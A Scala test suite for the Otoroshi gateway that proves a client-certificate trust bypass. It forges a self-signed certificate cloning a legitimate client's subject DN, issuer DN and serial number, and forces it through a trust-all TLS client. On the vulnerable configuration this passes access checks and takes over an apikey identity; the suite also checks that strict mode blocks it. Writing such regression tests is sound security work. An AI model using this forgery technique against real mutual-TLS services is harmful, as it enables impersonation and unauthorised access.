package functional

import com.typesafe.config.ConfigFactory
import org.apache.commons.codec.binary.Base64
import org.bouncycastle.asn1.x500.X500Name
import org.bouncycastle.asn1.x509.{BasicConstraints, ExtendedKeyUsage, Extension, KeyPurposeId, KeyUsage}
import org.bouncycastle.cert.jcajce.{JcaX509CertificateConverter, JcaX509v3CertificateBuilder}
import org.bouncycastle.operator.jcajce.JcaContentSignerBuilder
import otoroshi.api.Otoroshi
import otoroshi.env.Env
import otoroshi.models.TlsSettings
import otoroshi.next.models.{NgPluginInstance, NgPluginInstanceConfig}
import otoroshi.next.plugins.api.NgPluginHelper
import otoroshi.next.plugins.{ApikeyCalls, NgCertificateAsApikey, NgHasClientCertMatchingValidator, NgHasClientCertMatchingValidatorConfig}
import otoroshi.security.IdGenerator
import otoroshi.ssl.pki.models.{GenCsrQuery, GenKeyPairQuery}
import otoroshi.ssl.{Cert, ClientAuth, DynamicSSLEngineProvider, FakeKeyStore}
import otoroshi.utils.http.DN
import otoroshi.utils.syntax.implicits.*
import play.api.Configuration
import play.api.libs.json.JsObject
import play.core.server.ServerConfig

import java.io.{BufferedReader, InputStreamReader}
import java.math.BigInteger
import java.net.InetSocketAddress
import java.nio.file.Files
import java.security.cert.X509Certificate
import java.security.{KeyPairGenerator, PrivateKey, SecureRandom}
import java.util.concurrent.atomic.AtomicReference
import javax.net.ssl.{KeyManager, SNIHostName, SSLContext, SSLSocket, TrustManager, X509TrustManager}
import scala.concurrent.Await
import scala.concurrent.duration.*
import scala.util.Try

/**
 * PROOF-OF-CONCEPT for the reported weakness:
 *
 *   "The server side trust manager is FakeTrustManager (ssl/ssl.scala), whose checkClientTrusted uses
 *    managers.find(... isSuccess) and never throws, so the TLS layer accepts any client certificate
 *    whatever trustedCAsServer contains; the strictBackendServerValidation flag only hardens outgoing
 *    (backend server) validation; the access plugins (NgHasClientCertMatchingValidator,
 *    NgCertificateAsApikey) match serial, subject DN and issuer DN strings with regexes and never verify
 *    the chain signature. => an attacker forges a self signed certificate with the expected subject and
 *    issuer DN and passes both the TLS handshake and the matching plugins."
 *
 * Setup: a REAL Otoroshi HTTPS listener, ClientAuth.Need, and `tlsSettings.trustedCAsServer` explicitly
 * restricted to the single PoC CA — so the test exercises the exact configuration the report says gives a
 * false sense of security.
 *
 * The attacker's certificate is FULLY SPOOFED: it clones the subject DN, the issuer DN *and* the serial
 * number of a legitimate client certificate, but is signed by the attacker's own key (no CA involved).
 * It therefore satisfies every identity field the matching plugins can look at.
 *
 * Four routes, one per bypassable check, all hit with that single forged certificate:
 *   - subject DN regex  (NgHasClientCertMatchingValidator.regexSubjectDNs)
 *   - issuer DN regex   (NgHasClientCertMatchingValidator.regexIssuerDNs)
 *   - serial number     (NgHasClientCertMatchingValidator.serialNumbers)
 *   - NgCertificateAsApikey + ApikeyCalls (identity takeover: the forged cert maps to the SAME apikey)
 *
 * All scenarios leave the STATIC config at its default ("global"), so they exercise the real resolution
 * path (Env.strictBackendServerValidation reads the global config's TlsSettings flag):
 *   - FRESH install: the case-class default persists `true` -> NewFakeTrustManager -> NOT vulnerable.
 *   - UPGRADED install: a persisted config predating the field reads it back as `false` (TlsSettings JSON
 *     reads default) -> FakeTrustManager -> VULNERABLE: the forged cert reaches the backend with HTTP 200
 *     on all four routes. This is the real-world affected population.
 *   - flag set back to `true` -> SAFE: forged cert rejected during the TLS handshake.
 *
 * Guards against passing for the wrong reason:
 *   - the trust manager actually installed is asserted (FakeTrustManager vs NewFakeTrustManager);
 *   - a legitimate CA-signed control certificate must reach 200 in BOTH modes, so a rejected forgery
 *     really means "forgery rejected" and not "route broken / server down";
 *   - the probe reports handshake success and HTTP status separately, so "handshake refused" is never
 *     confused with "handshake fine but request denied".
 */
class FakeTrustManagerVulnSpec(configurationSpec: => Configuration) extends OtoroshiSpec {

  private val otoRef      = new AtomicReference[Otoroshi]()
  private var otoEnv: Env = scala.compiletime.uninitialized

  private val caId          = "poc-ca"
  private val expectedCN    = "trusted-client"
  private val trustedSubject = s"CN=$expectedCN, O=Otoroshi Test"
  private val legitSerial   = BigInteger.valueOf(4242424242L)

  // one route per bypassable identity check
  private val subjectDomain = "by-subject.foo.tools"
  private val issuerDomain  = "by-issuer.foo.tools"
  private val serialDomain  = "by-serial.foo.tools"
  private val apikeyDomain  = "by-apikey.foo.tools"
  private val allDomains    = Seq(subjectDomain, issuerDomain, serialDomain, apikeyDomain)

  private var currentStrictMode: String = "legacy"

  override def getTestConfiguration(configuration: Configuration): Configuration = {
    Configuration(
      ConfigFactory
        .parseString(s"""
          |otoroshi.next.state-sync-interval = 5
          |otoroshi.ssl.trust.strictBackendServerValidation = "$currentStrictMode"
          |otoroshi.ssl.fromOutside.clientAuth = "Dynamic"
          |""".stripMargin)
        .resolve()
    ).withFallback(configurationSpec).withFallback(configuration)
  }

  // -------------------------------------------------------------------------------------------------
  // startup (self-managed instance so the static trust mode can be flipped between runs)
  // -------------------------------------------------------------------------------------------------

  private def startInstance(): Unit = {
    val otoroshi = Otoroshi(
      ServerConfig(
        address = "0.0.0.0",
        port = Some(port),
        sslPort = Some(httpsPort),
        rootDir = Files.createTempDirectory("otoroshi-faketm-vuln").toFile
      ),
      getTestConfiguration(Configuration(ConfigFactory.parseString("").resolve())).underlying
    )
    otoRef.set(otoroshi.startAndStopOnShutdown())
    otoEnv = otoroshi.env
    awaitCond(30.seconds) {
      Try(
        wsClient.url(s"http://127.0.0.1:$port/health").withRequestTimeout(1.second).get().futureValue.status == 200
      ).getOrElse(false)
    }
  }

  private def stopInstance(): Unit = Option(otoRef.getAndSet(null)).foreach(o => Try(o.stop()))

  private def awaitCond(timeout: FiniteDuration)(cond: => Boolean): Unit = {
    val deadlineMs = System.currentTimeMillis() + timeout.toMillis
    while (!cond && System.currentTimeMillis() < deadlineMs) { await(300.millis) }
    if (!cond) throw new RuntimeException("condition not met within timeout")
  }

  // -------------------------------------------------------------------------------------------------
  // certificates
  // -------------------------------------------------------------------------------------------------

  private def serverCert(host: String)(using e: Env): Cert = {
    val ca = FakeTrustManagerVulnSpec.testCa(e)
    FakeKeyStore
      .createCertificateFromCA(host, 3650.days, None, None, ca.cert, ca.caChain, ca.keyPair)(using e)
      .toCert
      .copy(id = s"srv-${IdGenerator.token(8)}", name = host, description = host)
  }

  /** LEGIT client cert: signed by the PoC CA, which is the ONLY entry of trustedCAsServer. */
  private def legitClientCert()(using e: Env): (PrivateKey, Array[X509Certificate]) = {
    val ca   = FakeTrustManagerVulnSpec.testCa(e)
    val resp = FakeKeyStore.createClientCertificateFromCA(
      trustedSubject,
      3650.days,
      None,
      Some(legitSerial.longValue()),
      ca.cert,
      ca.caChain,
      ca.keyPair
    )(using e)
    (resp.key, Array(resp.cert, resp.ca))
  }

  /**
   * FULLY SPOOFED client cert: clones the subject DN, the issuer DN and the serial number of `legit`, but
   * is signed by a freshly generated attacker key (so it is really self-signed, just wearing the CA's name
   * in its issuer field). No CA is involved and nothing in it is verifiable — only the *strings* match.
   */
  private def forgedClientCert(legit: X509Certificate): (PrivateKey, Array[X509Certificate]) = {
    val kpg = KeyPairGenerator.getInstance("RSA")
    kpg.initialize(2048)
    val kp       = kpg.generateKeyPair()
    val now      = new java.util.Date(System.currentTimeMillis() - 60000L)
    val notAfter = new java.util.Date(System.currentTimeMillis() + 3650L * 24 * 3600 * 1000)
    val builder  = new JcaX509v3CertificateBuilder(
      X500Name.getInstance(legit.getIssuerX500Principal.getEncoded),  // claim the trusted CA as issuer
      legit.getSerialNumber,                                          // clone the serial number
      now,
      notAfter,
      X500Name.getInstance(legit.getSubjectX500Principal.getEncoded), // clone the subject DN
      kp.getPublic
    )
    builder.addExtension(Extension.basicConstraints, true, new BasicConstraints(false))
    builder.addExtension(Extension.keyUsage, true, new KeyUsage(KeyUsage.digitalSignature | KeyUsage.keyEncipherment))
    builder.addExtension(Extension.extendedKeyUsage, false, new ExtendedKeyUsage(KeyPurposeId.id_kp_clientAuth))
    val signer = new JcaContentSignerBuilder("SHA256WithRSA").build(kp.getPrivate) // signed by the ATTACKER
    val cert   = new JcaX509CertificateConverter().getCertificate(builder.build(signer))
    (kp.getPrivate, Array(cert)) // present only the leaf: nobody can vouch for it
  }

  /** a self-signed cert that does NOT clone anything: must be rejected by the plugins in every mode */
  private def unrelatedSelfSignedCert()(using e: Env): (PrivateKey, Array[X509Certificate]) = {
    val resp = Await
      .result(
        e.pki.genSelfSignedCert(
          GenCsrQuery(
            hosts = Seq.empty,
            key = GenKeyPairQuery(
              FakeKeyStore.KeystoreSettings.KeyPairAlgorithmName,
              FakeKeyStore.KeystoreSettings.KeyPairKeyLength
            ),
            subject = Some("CN=nobody, O=Attacker"),
            duration = 3650.days,
            client = true
          )
        ),
        30.seconds
      )
      .toOption
      .get
    (resp.key, Array(resp.cert))
  }

  // -------------------------------------------------------------------------------------------------
  // raw SSLSocket probe (the client trusts everything, so we observe the SERVER's decision only)
  // -------------------------------------------------------------------------------------------------

  private def clientSslContext(clientCert: Option[(PrivateKey, Array[X509Certificate])]): SSLContext = {
    val trustAll: Array[TrustManager] = Array(new X509TrustManager {
      def checkClientTrusted(chain: Array[X509Certificate], authType: String): Unit = ()
      def checkServerTrusted(chain: Array[X509Certificate], authType: String): Unit = ()
      def getAcceptedIssuers: Array[X509Certificate]                                = Array.empty
    })
    val kms: Array[KeyManager]        = clientCert match {
      case None               => null
      case Some((key, chain)) => forcingKeyManagers(key, chain)
    }
    val ctx = SSLContext.getInstance("TLS")
    ctx.init(kms, trustAll, new SecureRandom())
    ctx
  }

  /**
   * A KeyManager that ALWAYS presents the given client certificate, ignoring the acceptable-CA list the
   * server advertises in its CertificateRequest. This models a real attacker (who controls their own
   * client) rather than a well-behaved JDK SunX509 KeyManager, which silently withholds a certificate
   * whose issuer is not in that list. The list is advisory in TLS, so a server can never rely on a
   * cooperative client: it MUST validate the presented chain itself.
   */
  private def forcingKeyManagers(key: PrivateKey, chain: Array[X509Certificate]): Array[KeyManager] = {
    val alias = "attacker"
    val km    = new javax.net.ssl.X509ExtendedKeyManager {
      override def getClientAliases(keyType: String, issuers: Array[java.security.Principal]): Array[String] = Array(alias)
      override def chooseClientAlias(keyType: Array[String], issuers: Array[java.security.Principal], socket: java.net.Socket): String = alias
      override def chooseEngineClientAlias(keyType: Array[String], issuers: Array[java.security.Principal], engine: javax.net.ssl.SSLEngine): String = alias
      override def getServerAliases(keyType: String, issuers: Array[java.security.Principal]): Array[String] = null
      override def chooseServerAlias(keyType: String, issuers: Array[java.security.Principal], socket: java.net.Socket): String = null
      override def chooseEngineServerAlias(keyType: String, issuers: Array[java.security.Principal], engine: javax.net.ssl.SSLEngine): String = null
      override def getCertificateChain(a: String): Array[X509Certificate] = chain
      override def getPrivateKey(a: String): PrivateKey                   = key
    }
    Array(km)
  }

  /** handshake and HTTP status are reported separately so the two failure modes are never conflated */
  private case class Probe(handshake: Boolean, status: Option[Int]) {
    def reachedBackend: Boolean = handshake && status.contains(200)
  }

  private def probe(sni: String, clientCert: Option[(PrivateKey, Array[X509Certificate])]): Probe = {
    val ctx    = clientSslContext(clientCert)
    val socket = ctx.getSocketFactory.createSocket().asInstanceOf[SSLSocket]
    try {
      socket.connect(new InetSocketAddress("127.0.0.1", httpsPort), 5000)
      socket.setSoTimeout(5000)
      // force TLS 1.2 so ClientAuth.Need is enforced DURING the handshake (TLS 1.3 defers it post-handshake)
      socket.setEnabledProtocols(Array("TLSv1.2"))
      val params = socket.getSSLParameters
      params.setServerNames(java.util.List.of[javax.net.ssl.SNIServerName](new SNIHostName(sni)))
      socket.setSSLParameters(params)
      socket.startHandshake()
      // from here the handshake DID succeed; an HTTP failure below is a separate outcome
      val status = Try {
        val out = socket.getOutputStream
        out.write(s"GET /probe HTTP/1.1\r\nHost: $sni\r\nConnection: close\r\n\r\n".getBytes("UTF-8"))
        out.flush()
        val in = new BufferedReader(new InputStreamReader(socket.getInputStream))
        Option(in.readLine()).flatMap(l => Try(l.split(" ")(1).toInt).toOption)
      }.toOption.flatten
      Probe(handshake = true, status = status)
    } catch {
      case _: Throwable => Probe(handshake = false, status = None)
    } finally {
      Try(socket.close())
    }
  }

  // -------------------------------------------------------------------------------------------------
  // fixtures
  // -------------------------------------------------------------------------------------------------

  private def matchingRoute(domain: String, config: NgHasClientCertMatchingValidatorConfig): Unit = {
    createLocalRoute(
      rawDomain = Some(domain),
      plugins = Seq(
        NgPluginInstance(
          plugin = NgPluginHelper.pluginId[NgHasClientCertMatchingValidator],
          config = NgPluginInstanceConfig(config.json.as[JsObject])
        )
      ),
      customOtoroshiPort = Some(port)
    ).futureValue
  }

  private def setupCertsAndRoutes(strictInGlobalConfig: Boolean): Unit = {
    implicit val e: Env = otoEnv
    val certs           = Seq(
      FakeTrustManagerVulnSpec.testCa(otoEnv).toCert.copy(id = caId, name = caId, description = caId, ca = true)
    ) ++ allDomains.map(serverCert)
    DynamicSSLEngineProvider.addCertificates(certs, otoEnv)
    awaitCond(30.seconds)(Try(probe(subjectDomain, None).handshake).getOrElse(false))

    // one route per bypassable identity check
    matchingRoute(subjectDomain, NgHasClientCertMatchingValidatorConfig(regexSubjectDNs = Seq(s".*$expectedCN.*")))
    matchingRoute(issuerDomain, NgHasClientCertMatchingValidatorConfig(regexIssuerDNs = Seq(".*Otoroshi FakeTM PoC CA.*")))
    matchingRoute(serialDomain, NgHasClientCertMatchingValidatorConfig(serialNumbers = Seq(legitSerial.toString(16))))
    // client cert used AS an apikey -> identity takeover
    createLocalRoute(
      rawDomain = Some(apikeyDomain),
      plugins = Seq(
        NgPluginInstance(plugin = NgPluginHelper.pluginId[NgCertificateAsApikey]),
        NgPluginInstance(plugin = NgPluginHelper.pluginId[ApikeyCalls])
      ),
      customOtoroshiPort = Some(port)
    ).futureValue
    await(2.seconds)

    // THE configuration the report is about: require a client cert, and restrict the trusted CAs for TLS
    // termination to the single PoC CA. `strictBackendServerValidation` is what an upgraded install (false,
    // the JSON reads default) vs a fresh one (true) ends up with.
    setTls(
      _.copy(
        clientAuth = ClientAuth.Need,
        trustedCAsServer = Seq(caId),
        strictBackendServerValidation = strictInGlobalConfig
      )
    )
    awaitCond(30.seconds) {
      otoEnv.datastores.globalConfigDataStore.latestSafe.exists(c =>
        c.tlsSettings.trustedCAsServer.contains(caId) &&
        c.tlsSettings.strictBackendServerValidation == strictInGlobalConfig
      )
    }
    // rebuild the SSL context so the new trustedCAsServer / trust mode are actually in effect
    DynamicSSLEngineProvider.forceUpdate(otoEnv)
    await(1.second)
  }

  private def setTls(f: TlsSettings => TlsSettings): Unit = {
    val gc = getOtoroshiConfig(customPort = Some(port)).futureValue
    updateOtoroshiConfig(gc.copy(tlsSettings = f(gc.tlsSettings)), customPort = Some(port)).futureValue
    await(1.second)
  }

  private def installedTrustManager: String =
    DynamicSSLEngineProvider.currentServerTrustManager.getClass.getSimpleName

  /** the clientId NgCertificateAsApikey derives from a cert (subject DN + serial) */
  private def apikeyClientIdOf(cert: X509Certificate): String = {
    val subjectDN = DN(cert.getSubjectX500Principal.getName).stringify
    Base64.encodeBase64String((subjectDN + "-" + cert.getSerialNumber.toString).getBytes)
  }

  // -------------------------------------------------------------------------------------------------
  // the attack
  // -------------------------------------------------------------------------------------------------

  private def runAttack(vulnerable: Boolean): Unit = {
    implicit val e: Env = otoEnv
    val legit           = legitClientCert()
    val forged          = forgedClientCert(legit._2.head)
    val unrelated       = unrelatedSelfSignedCert()

    // --- the forged cert really is a forgery, and really does clone the identity fields ---------------
    val legitCert  = legit._2.head
    val forgedCert = forged._2.head
    withClue("forged cert must clone the subject DN: ") {
      forgedCert.getSubjectX500Principal mustBe legitCert.getSubjectX500Principal
    }
    withClue("forged cert must clone the issuer DN: ") {
      forgedCert.getIssuerX500Principal mustBe legitCert.getIssuerX500Principal
    }
    withClue("forged cert must clone the serial number: ") {
      forgedCert.getSerialNumber mustBe legitCert.getSerialNumber
    }
    withClue("forged cert must NOT be signed by the trusted CA (it is a forgery): ") {
      Try(forgedCert.verify(FakeTrustManagerVulnSpec.testCa(otoEnv).cert.getPublicKey)).isSuccess mustBe false
    }

    // --- the mechanism named in the report is the one actually installed -----------------------------
    withClue("server trust manager actually installed: ") {
      installedTrustManager mustBe (if (vulnerable) "FakeTrustManager" else "NewFakeTrustManager")
    }

    // --- control: a legitimate CA-signed cert works in BOTH modes ------------------------------------
    allDomains.foreach { d =>
      withClue(s"control (legit CA-signed cert) on $d must reach the backend: ") {
        probe(d, Some(legit)).reachedBackend mustBe true
      }
    }

    // --- the attack ---------------------------------------------------------------------------------
    val probes = allDomains.map(d => d -> probe(d, Some(forged))).toMap
    if (vulnerable) {
      // LEGACY: FakeTrustManager.checkClientTrusted never throws -> the forged cert is accepted by the TLS
      // layer even though trustedCAsServer only contains the PoC CA; the plugins then only compare strings.
      allDomains.foreach { d =>
        withClue(s"VULNERABLE (legacy): forged cert must complete the TLS handshake on $d: ") {
          probes(d).handshake mustBe true
        }
        withClue(s"VULNERABLE (legacy): forged cert must reach the backend on $d (status ${probes(d).status}): ") {
          probes(d).reachedBackend mustBe true
        }
      }
      // identity takeover: the forged cert maps to the very same apikey as the legitimate one
      val expectedClientId = apikeyClientIdOf(legitCert)
      withClue("forged cert must derive the SAME apikey clientId as the legit one: ") {
        apikeyClientIdOf(forgedCert) mustBe expectedClientId
      }
      withClue("the apikey minted from the client cert must exist: ") {
        otoEnv.datastores.apiKeyDataStore.findById(expectedClientId).futureValue.isDefined mustBe true
      }
    } else {
      // STRICT: NewFakeTrustManager validates the presented client chain -> rejected at the handshake.
      allDomains.foreach { d =>
        withClue(s"SAFE (strict): forged cert must be rejected at the TLS handshake on $d: ") {
          probes(d).handshake mustBe false
        }
        withClue(s"SAFE (strict): forged cert must NOT reach the backend on $d: ") {
          probes(d).reachedBackend mustBe false
        }
      }
    }

    // --- sanity: a cert that clones nothing is refused by the plugins even in the vulnerable mode -----
    // (in legacy the handshake still succeeds, but no identity field matches -> 403)
    val unrelatedProbe = probe(subjectDomain, Some(unrelated))
    withClue(s"an unrelated self-signed cert must never reach the backend (status ${unrelatedProbe.status}): ") {
      unrelatedProbe.reachedBackend mustBe false
    }
    if (vulnerable) {
      withClue("in legacy mode the unrelated cert is accepted by TLS but denied by the plugin (403): ") {
        unrelatedProbe.status mustBe Some(403)
      }
    }
  }

  // Both scenarios below leave the STATIC config at its default ("global"), so they exercise the real
  // resolution path: Env.strictBackendServerValidation reads the global config's TlsSettings flag.
  "FakeTrustManager client-cert weakness" should {

    "leave a FRESH install on strict validation (case-class default is true -> not vulnerable)" in {
      currentStrictMode = "global"
      startInstance()
      try {
        implicit val e: Env = otoEnv
        DynamicSSLEngineProvider.addCertificates(
          Seq(
            FakeTrustManagerVulnSpec.testCa(otoEnv).toCert.copy(id = caId, name = caId, description = caId, ca = true),
            serverCert(subjectDomain)
          ),
          otoEnv
        )
        await(2.seconds)
        withClue("a fresh install persists the case-class default (true): ") {
          otoEnv.datastores.globalConfigDataStore.latestSafe
            .map(_.tlsSettings.strictBackendServerValidation) mustBe Some(true)
        }
        withClue("so a fresh install resolves to strict: ") {
          otoEnv.strictBackendServerValidation mustBe true
        }
        withClue("and installs the strict trust manager: ") {
          installedTrustManager mustBe "NewFakeTrustManager"
        }
      } finally stopInstance()
    }

    // An install upgraded from an older version has a persisted global config JSON WITHOUT the
    // `strictBackendServerValidation` field; TlsSettings' JSON reads default it to false. That is the
    // real-world vulnerable population.
    "be exploitable on an UPGRADED install (flag false -> FakeTrustManager, forgery passes everything)" in {
      currentStrictMode = "global"
      startInstance()
      try {
        setupCertsAndRoutes(strictInGlobalConfig = false)
        runAttack(vulnerable = true)
      } finally stopInstance()
    }

    "be mitigated once the flag is true (forged cert rejected at the TLS handshake)" in {
      currentStrictMode = "global"
      startInstance()
      try {
        setupCertsAndRoutes(strictInGlobalConfig = true)
        runAttack(vulnerable = false)
      } finally stopInstance()
    }
  }
}

object FakeTrustManagerVulnSpec {
  private val caRef = new AtomicReference[otoroshi.ssl.pki.models.GenCertResponse]()
  def testCa(env: Env): otoroshi.ssl.pki.models.GenCertResponse = {
    if (caRef.get() == null) {
      caRef.compareAndSet(
        null,
        FakeKeyStore.createCA("CN=Otoroshi FakeTM PoC CA, O=Otoroshi Test", 3650.days, None, None)(using env)
      )
    }
    caRef.get()
  }
}
